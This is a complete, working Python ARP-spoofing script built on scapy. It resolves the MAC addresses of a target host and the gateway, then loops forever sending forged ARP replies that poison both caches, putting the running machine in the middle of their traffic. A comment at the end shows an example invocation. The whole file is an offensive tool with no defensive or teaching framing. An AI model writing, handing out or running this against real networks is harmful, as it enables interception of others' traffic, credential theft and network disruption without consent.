import scapy.all as scapy
import sys
import time

def get_mac_address(ip_address):
    # broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    # arp_layer = scapy.ARP(pdst=ip_address)
    # get_mac_packet = broadcast_layer/arp_layer
    # answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    # return answer[0][1].hwsrc
    return scapy.getmacbyip(ip_address)

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = sys.argv[2] # Enter your target IP
router_ip = sys.argv[1] # Enter your gateway's IP
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

print('target_mac', target_mac)
print('router_mac', router_mac)

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)

# python arpspoofer.py 192.168.1.1 192.168.1.4
